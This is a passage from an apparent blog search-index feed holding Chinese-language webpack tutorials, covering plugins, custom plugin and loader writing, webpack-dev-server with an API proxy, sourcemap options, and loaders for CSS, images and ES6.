punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 用于生成 about.html</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      filename<span class="token punctuation">:</span> <span class="token string">'about.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="copy-webpack-plugin"><a href="#copy-webpack-plugin" class="headerlink" title="copy-webpack-plugin"></a>copy-webpack-plugin</h3><pre class=" language-js"><code class="language-js"> plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CopyWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">[</span>      <span class="token comment" spellcheck="true">// 'public/**'</span>      <span class="token string">'public'</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span></code></pre><h3 id="插件原理"><a href="#插件原理" class="headerlink" title="插件原理"></a>插件原理</h3><blockquote><p>webpack过程中存在钩子函数，插件挂载在其上面</p><p>例：实现移除bundle.js中的注释</p></blockquote><h3 id="理解Compiler（负责编译）"><a href="#理解Compiler（负责编译）" class="headerlink" title="理解Compiler（负责编译）"></a>理解Compiler（负责编译）</h3><p>开发插件首先要知道<code>compiler</code>和 <code>compilation</code> 对象是做什么的</p><p><code>Compiler</code> 对象包含了当前运行<code>Webpack</code>的配置，包括<code>entry、output、loaders</code>等配置，这个对象在启动<code>Webpack</code>时被实例化，而且是全局唯一的。<code>Plugin</code>可以通过该对象获取到Webpack的配置信息进行处理。</p><h3 id="理解Compilation"><a href="#理解Compilation" class="headerlink" title="理解Compilation"></a>理解Compilation</h3><p><code>Compilation</code>对象代表了一次资源版本构建。当运行 <code>webpack</code> 开发环境中间件时，每当检测到一个文件变化，就会创建一个新的 <code>compilation</code>，从而生成一组新的编译资源。一个 <code>Compilation</code> 对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息，简单来讲就是把本次打包编译的内容存到内存里。<code>Compilation</code> 对象也提供了插件需要自定义功能的回调，以供插件做自定义处理时选择使用拓展。</p><p><code>apply</code>方法中插入钩子的一般形式如下：</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// compiler提供了compiler.hooks，可以根据这些不同的时刻去让插件做不同的事情。</span>compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">.</span>阶段<span class="token punctuation">.</span>tap函数<span class="token punctuation">(</span><span class="token string">'插件名称'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>阶段回调参数<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>compiler<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span><span class="token keyword">class</span> <span class="token class-name">MyPlugin</span> <span class="token punctuation">{</span>  apply <span class="token punctuation">(</span>compiler<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// compiler对象为webpack一核心对象，通过他来找钩子函数</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MyPlugin 启动'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// Webpack 会调用 Plugin 实例的 apply 方法给插件实例传入 compiler 对象</span>    compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">.</span>emit<span class="token punctuation">.</span><span class="token function">tap</span><span class="token punctuation">(</span><span class="token string">'MyPlugin'</span><span class="token punctuation">,</span> compilation <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 挂载在emit方法上</span>      <span class="token comment" spellcheck="true">// compilation => 可以理解为此次打包的上下文</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> name <span class="token keyword">in</span> compilation<span class="token punctuation">.</span>assets<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// console.log(name)                              // 输出文件名</span>        <span class="token comment" spellcheck="true">// console.log(compilation.assets[name].source()) // 输出文件内容 </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">const</span> contents <span class="token operator">=</span> compilation<span class="token punctuation">.</span>assets<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 获取内容</span>          <span class="token keyword">const</span> withoutComments <span class="token operator">=</span> contents<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\/\*\*+\*\//g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 删除注释</span>          compilation<span class="token punctuation">.</span>assets<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>            source<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> withoutComments<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 替换内容</span>            size<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> withoutComments<span class="token punctuation">.</span>length <span class="token comment" spellcheck="true">// 必要注释：长度</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">MyPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span></code></pre><h2 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h2><p><strong>如何自动编译：修改源文件后自动打包</strong></p><p>只需要在启动<code>webpack</code>命令时，添加<code>webpack --watch</code>即可</p><p><strong>如何自动刷新浏览器</strong></p><p>使用<code>browser-sync</code>：<code>browser-sync dist --files &quot;**/*&quot;</code></p><blockquote><p>组合这两种方式可以实现，修改源文件时自动刷新浏览器。</p><p>缺点：1. 操作复杂：需要同时运行两个终端命令。2. 消耗大：先打包写入磁盘，再读出磁盘刷新浏览器</p></blockquote><p><strong>webpack-dev-server</strong></p><p><code>webpack dev server</code>：将自动编译和自动刷新集成在一起</p><p>安装：<code>cnpm install -D webpack-dev-server</code></p><blockquote><p>优点：不会生成dist目录造成磁盘读写操作，均存储在内存中</p><p>webpack-dev-server –open 命令可自动打开浏览器</p></blockquote><p><strong>静态资源文件的处理</strong></p><blockquote><p>在开发阶段，因为要频繁的打包和编译，尽量不将图片等静态资源文件一起打包到dist目录中</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    contentBase<span class="token punctuation">:</span> <span class="token string">'./public'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 使用contentBase来设置</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// ...</span>    <span class="token comment" spellcheck="true">// // 开发阶段最好不要使用这个插件</span>    <span class="token comment" spellcheck="true">// new CopyWebpackPlugin(['public'])</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h3><blockquote><p> 由于 webpack-dev-server 是一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上。但是最终上线过后，我们的应用一般又会和后端服务部署到同源地址下。</p><p>​    那这样就会出现一个非常常见的问题：在实际生产环境中能够直接访问的 API，回到我们的开发环境后，再次访问这些 API 就会产生跨域请求问题。</p><p>​    可能有人会说，我们可以用跨域资源共享（CORS）解决这个问题。确实如此，如果我们请求的后端 API 支持 CORS，那这个问题就不成立了。但是并不是每种情况下服务端的 API 都支持 CORS。如果前后端应用是同源部署，也就是协议 / 域名 / 端口一致，那这种情况下，根本没必要开启 CORS，所以跨域请求的问题仍然是不可避免的。</p><p>​    那解决这种开发阶段跨域请求问题最好的办法，就是在开发服务器中配置一个后端 API 的代理服务，也就是把后端接口服务代理到本地的开发服务地址。</p><p>​    webpack-dev-server 就支持直接通过配置的方式，添加代理服务。接下来，我们来看一下它的具体用法。</p><p>比如我们假定 GitHub 的 API 就是我们应用的后端服务，那我们的目标就是将 GitHub API 代理到本地开发服务器中，我们可以先在浏览器中尝试访问其中的一个接口： <a href="https://api.github.com/users/mojombo/followers" target="_blank" rel="noopener">https://api.github.com/users</a></p></blockquote><pre class=" language-js"><code class="language-js">devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>    contentBase<span class="token punctuation">:</span> <span class="token string">'./public'</span><span class="token punctuation">,</span>    proxy<span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token string">'/api'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// http://localhost:8080/api/users -> https://api.github.com/api/users</span>        target<span class="token punctuation">:</span> <span class="token string">'https://api.github.com'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// http://localhost:8080/api/users -> https://api.github.com/users</span>        pathRewrite<span class="token punctuation">:</span> <span class="token punctuation">{</span>          <span class="token string">'^/api'</span><span class="token punctuation">:</span> <span class="token string">''</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 不能使用 localhost:8080 作为请求 GitHub 的主机名</span>        changeOrigin<span class="token punctuation">:</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200531181008355.png" alt="1"></p><p>那此时我们请求 <a href="http://localhost:8080/api/users" target="_blank" rel="noopener">http://localhost:8080/api/users</a> ，就相当于请求了 <a href="https://api.github.com/users" target="_blank" rel="noopener">https://api.github.com/users</a></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 此时再写跨域请求，就可正常访问</span><span class="token comment" spellcheck="true">// 虽然 GitHub 支持 CORS，但是不是每个服务端都应该支持。</span><span class="token comment" spellcheck="true">// fetch('https://api.github.com/users')</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/users'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 实际请求到http://localhost:8080/api/users</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    data<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span>      li<span class="token punctuation">.</span>textContent <span class="token operator">=</span> item<span class="token punctuation">.</span>login      ul<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="Sourcemap"><a href="#Sourcemap" class="headerlink" title="Sourcemap"></a>Sourcemap</h2><blockquote><p>SourceMap是一种映射关系。当项目运行后，如果出现错误，错误信息只能定位到打包后文件中错误的位置。如果想查看在源文件中错误的位置，则需要使用映射关系，找到对应的位置。</p></blockquote><p>那么如何在webpack中配置Sourcemap呢？</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  devtool<span class="token punctuation">:</span> <span class="token string">'source-map'</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 此时在代码中写一个错误，就可以在控制台看到源文件的错误</span></code></pre><p>该配置可选且具有多个配置项 ，具体包含以下：</p><table><thead><tr><th>devtool</th><th>构建速度</th><th>重新构建速度</th><th>生产环境</th><th>品质(quality)</th></tr></thead><tbody><tr><td>(none)</td><td>+++</td><td>+++</td><td>yes</td><td>打包后的代码</td></tr><tr><td>eval</td><td>+++</td><td>+++</td><td>no</td><td>生成后的代码</td></tr><tr><td>cheap-eval-source-map</td><td>+</td><td>++</td><td>no</td><td>转换过的代码（仅限行）</td></tr><tr><td>cheap-module-eval-source-map</td><td>o</td><td>++</td><td>no</td><td>原始源代码（仅限行）</td></tr><tr><td>eval-source-map</td><td>–</td><td>+</td><td>no</td><td>原始源代码</td></tr><tr><td>cheap-source-map</td><td>+</td><td>o</td><td>yes</td><td>转换过的代码（仅限行）</td></tr><tr><td>cheap-module-source-map</td><td>o</td><td>-</td><td>yes</td><td>原始源代码（仅限行）</td></tr><tr><td>inline-cheap-source-map</td><td>+</td><td>o</td><td>no</td><td>转换过的代码（仅限行）</td></tr><tr><td>inline-cheap-module-source-map</td><td>o</td><td>-</td><td>no</td><td>原始源代码（仅限行）</td></tr><tr><td>source-map</td><td>–</td><td>–</td><td>yes</td><td>原始源代码</td></tr><tr><td>inline-source-map</td><td>–</td><td>–</td><td>no</td><td>原始源代码</td></tr><tr><td>hidden-source-map</td><td>–</td><td>–</td><td>yes</td><td>原始源代码</td></tr><tr><td>nosources-source-map</td><td>–</td><td>–</td><td>yes</td><td>无源代码内容</td></tr></tbody></table><blockquote><p><em>+++ 非常快速, ++ 快速, + 比较快, o 中等, - 比较慢, – 慢</em></p></blockquote><ul><li>eval：是否使用 eval 执行模块代码，通过 SourceURL 标注文件路径，并没有生成 SourceMap</li><li>cheap：Source map是否包含行信息</li><li>module：是否能够得到 Loader 处理之前的源代码</li><li>inline：使用 dataURL 把 SourceMap 嵌入 （不常用）</li><li>hidden：控制台看不到SourceMap</li><li>nosources：看不见源代码，生产环境保护源代码</li></ul><hr><ul><li>eval-source-map：相比 eval 生成了 SourceMap</li><li>cheap-eval-source-map：简单版的eval-source-map，只有行没有列</li><li>cheap-module-eval-source-map：没有经过 loader 加工，真正的源代码（vue中常用）</li></ul><hr><p>开发模式：cheap-eval-source-map</p><p>生产模式：none</p>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（一）</title>
      <link href="2020/09/06/webpack-webPack%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/09/06/webpack-webPack%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>webpack初体验</li><li>如何打包css和图片</li><li>常用加载器分类</li><li>如何处理ES6语法</li><li>模块加载方式</li><li>自己创建一个loader</li></ul><h2 id="webpack初体验"><a href="#webpack初体验" class="headerlink" title="webpack初体验"></a>webpack初体验</h2><blockquote><p> webpack是一种前端资源构建工具，一个静态模块打包器（module bundler）。在webpack看来，前端的所有资源文件（js/json/css/img/less…）都会作为模块处理。它将根据模块的依赖关系进行静态分析，打包生成对应的静态资源（bundle）</p></blockquote><p>安装：<code>cnpm install -D webpack webpack-cli</code>，举例：比如此时有如下的目录结构</p><pre class=" language-js"><code class="language-js"><span class="token operator">|</span><span class="token operator">--</span>src    <span class="token operator">--</span>heading<span class="token punctuation">.</span>js  <span class="token comment" spellcheck="true">// 遵循ES Modules</span>    <span class="token operator">--</span>index<span class="token punctuation">.</span>js<span class="token operator">|</span><span class="token operator">--</span>index<span class="token punctuation">.</span>html<span class="token operator">|</span><span class="token operator">--</span><span class="token keyword">package</span><span class="token punctuation">.</span>json</code></pre><p>其中<code>index.js</code>模块中引入了<code>heading.js</code>模块导出的方法，而<code>index.html</code>中又引入了<code>index.js</code>，默认入口为<code>src/index.js</code></p><blockquote><p>html文件中原本的引入</p><p>script type=”module” src=”src/index.js”</p></blockquote><p>运行<code>webpack</code>命令</p><pre class=" language-js"><code class="language-js"><span class="token operator">|</span><span class="token operator">--</span>dist    <span class="token operator">--</span>main<span class="token punctuation">.</span>js <span class="token comment" spellcheck="true">// 打包后的js文件</span><span class="token operator">|</span><span class="token operator">--</span>src    <span class="token operator">--</span>heading<span class="token punctuation">.</span>js    <span class="token operator">--</span>index<span class="token punctuation">.</span>js<span class="token operator">|</span><span class="token operator">--</span>index<span class="token punctuation">.</span>html<span class="token operator">|</span><span class="token operator">--</span><span class="token keyword">package</span><span class="token punctuation">.</span>json</code></pre><blockquote><p>html文件中，打包之后的引入</p><p>script src=”dist/main.js”</p></blockquote><h3 id="如何添加配置入口文件"><a href="#如何添加配置入口文件" class="headerlink" title="如何添加配置入口文件"></a>如何添加配置入口文件</h3><p>新建<code>webpack.config.js</code>文件，使用<code>common.js</code>规范</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// mode这个属性有三种取值，分别是 production、development 和 none。</span>  <span class="token comment" spellcheck="true">// 1. 生产模式下，Webpack 会自动优化打包结果；</span>  <span class="token comment" spellcheck="true">// 2. 开发模式下，Webpack 会自动优化打包速度，添加一些调试过程中的辅助；</span>  <span class="token comment" spellcheck="true">// 3. None 模式下，Webpack 就是运行最原始的打包，不做任何额外处理；</span>  mode<span class="token punctuation">:</span> <span class="token string">'development'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>     filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>     path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//必须是绝对路径，__dirname为当前文件夹路径,加上output，最终输出到output中</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="如何打包css文件"><a href="#如何打包css文件" class="headerlink" title="如何打包css文件"></a>如何打包css文件</h2><p>因为webpack默认打包js文件，所以我们需要额外的loader来处理，<code>cnpm install -D style-loader css-loader</code></p><ul><li>css-loader：处理css文件，将其打包至js文件中</li><li>style-loader：用于展示打包后的css文件</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 在webpack.config.js中新增</span> module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.css$/</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 遇到css文件时</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 采用如下loader，从后向前调用</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 然后比如在main.js中通过import的方式引入main.css文件</span><span class="token keyword">import</span> <span class="token string">'./main.css'</span><span class="token comment" spellcheck="true">// 此时运行webpack就会打包css文件</span></code></pre><h3 id="如何打包图片"><a href="#如何打包图片" class="headerlink" title="如何打包图片"></a>如何打包图片</h3><p><code>cnpm install -D file-loader url-loader</code>，首先在<code>main.js</code>使用import的方式中导入<code>./icon.png</code></p><ul><li>超出10KB的文件单独提取存放在dist中</li><li>小于10KB的文件转换为 Data URLs 嵌入代码中（base64编码）</li></ul><pre class=" language-js"><code class="language-js"><span class="token operator">|</span><span class="token operator">--</span>dist    <span class="token operator">--</span>bundle<span class="token punctuation">.</span>js     <span class="token operator">--</span>aaa0e<span class="token operator">...</span>png <span class="token comment" spellcheck="true">// 打包后的图片</span><span class="token operator">|</span><span class="token operator">--</span>src    <span class="token operator">--</span>heading<span class="token punctuation">.</span>js    <span class="token operator">--</span>main<span class="token punctuation">.</span>js    <span class="token operator">--</span>main<span class="token punctuation">.</span>css    <span class="token operator">--</span>icon<span class="token punctuation">.</span>png<span class="token operator">|</span><span class="token operator">--</span>index<span class="token punctuation">.</span>html<span class="token operator">|</span><span class="token operator">--</span><span class="token keyword">package</span><span class="token punctuation">.</span>json</code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    publicPath<span class="token punctuation">:</span> <span class="token string">'dist/'</span>                 <span class="token comment" spellcheck="true">// 因为index.html在根目录，所以图片也从根目录加载，不会显示，要加上dist</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.css$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.png$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 大于10KB的还会使用file-loader</span>          options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            limit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token comment" spellcheck="true">// 10 KB</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="常用加载器分类"><a href="#常用加载器分类" class="headerlink" title="常用加载器分类"></a>常用加载器分类</h2><ul><li>编译转换类：比如css-loader将css编译并嵌入在bundle.js</li><li>文件操作类：比如file-loader</li><li>代码检查类：比如eslint-loader</li></ul><h2 id="如何处理ES6语法"><a href="#如何处理ES6语法" class="headerlink" title="如何处理ES6语法"></a>如何处理ES6语法</h2><p>虽然webpack支持import和export模块化，但并不支持ES6语法</p><p><code>cnpm install -D babel-loader @babel/core @babel/preset-env</code></p><pre class=" language-json"><code class="language-json">// rules新增    <span class="token punctuation">{</span>        test<span class="token operator">:</span> /.js$/<span class="token punctuation">,</span>        use<span class="token operator">:</span> <span class="token punctuation">{</span>          loader<span class="token operator">:</span> 'babel-loader'<span class="token punctuation">,</span>          options<span class="token operator">:</span> <span class="token punctuation">{</span>            presets<span class="token operator">:</span> <span class="token punctuation">[</span>'@babel/preset-env'<span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre><h2 id="模块加载方式"><a href="#模块加载方式" class="headerlink" title="模块加载方式"></a>模块加载方式</h2><ul><li>遵循 ES Modules 标准的 import 声明（非特殊情况只用这一种）</li><li>遵循 CommonJS 标准的 require函数</li><li>遵循 AMD 标准的 define 函数和 require 函数</li><li><ul><li>样式代码中的@import指令和url函数</li><li>HTML 代码中图片标签的 src 属性，a标签的href属性（需要配置）</li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// html中的a标签的href属性需要配置</span>     <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.html$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'html-loader'</span><span class="token punctuation">,</span>          options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            attrs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'img:src'</span><span class="token punctuation">,</span> <span class="token string">'a:href'</span><span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre><h2 id="自己创建一个loader"><a href="#自己创建一个loader" class="headerlink" title="自己创建一个loader"></a>自己创建一个loader</h2><p>根目录下新建一个<code>markdown-loader.js</code>作为处理<code>md</code>文件的<code>loader</code>，然后在<code>webpack.config.js</code>中配置：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    publicPath<span class="token punctuation">:</span> <span class="token string">'dist/'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.md$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'html-loader'</span><span class="token punctuation">,</span>          <span class="token string">'./markdown-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// markdown-loader.js</span><span class="token keyword">const</span> marked <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'marked'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> source <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> <span class="token function">marked</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 返回 html 字符串交给下一个 loader 处理</span>  <span class="token keyword">return</span> html<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// loader管道示意</span><span class="token comment" spellcheck="true">// Source => md-loader => loader2 => loader3 => Result （js文件） </span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块化</title>
      <link href="2020/09/05/%E6%A8%A1%E5%9D%97%E5%8C%96-%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
      <url>2020/09/05/%E6%A8%A1%E5%9D%97%E5%8C%96-%E6%A8%A1%E5%9D%97%E5%8C%96/</url>
      
